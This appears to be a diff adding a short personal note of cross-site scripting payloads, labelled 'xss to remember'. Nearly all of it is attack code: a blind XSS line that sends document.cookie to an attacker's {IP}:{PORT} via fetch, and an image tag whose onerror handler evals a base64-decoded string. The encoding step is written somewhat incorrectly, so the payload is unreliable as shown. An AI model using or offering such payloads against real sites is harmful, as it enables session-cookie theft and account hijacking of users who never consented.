@@ -1,0 +1,7 @@
+# xss to remember
+
+blind:
+
+s = base64encode(fetch('http://{IP}:{PORT}/?cookie='+document.cookie))
+
+<img src=x onerror='eval(atob(s));' />
